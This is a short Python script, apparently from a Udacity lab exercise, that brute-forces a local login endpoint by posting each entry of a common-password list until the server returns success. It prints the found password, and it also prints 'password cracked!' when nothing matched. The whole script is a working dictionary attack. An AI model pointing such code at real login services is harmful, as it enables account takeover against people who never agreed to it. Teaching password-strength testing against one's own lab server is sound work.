# note: this is a udacity notebook exercise - update this so it can be tested in our virtual machine! 

# This method can be used to send a login post 
# request to our server
# returns True if 200 success on login attempt
# returns False otherwise (failure, errors)

import requests  # need to run 'pip3 install' on this

def try_password(password, print_all=False):
    # specify where to make the request
    url = 'http://127.0.0.1:5000/login'
    
    # define the payload for the post request
    payload = {'password': password}
    
    # make the request
    r = requests.post(url, json=payload)
    
    # print some results (http status code)
    if(print_all):
        print(payload['password'] + ":" + str(r.status_code))
    
    # determine if we've gained access 200 = success!
    if(r.status_code == 200):
        print("the password is: " + payload['password'])
        return True
    else:
        return False

with open('nist_10000.txt', newline='') as bad_passwords:
    nist_bad = bad_passwords.read().split('\n')
    # print(nist_bad[1:10])


    for bad_pass in nist_bad:
        if try_password(bad_pass):
            break

    print('password cracked!')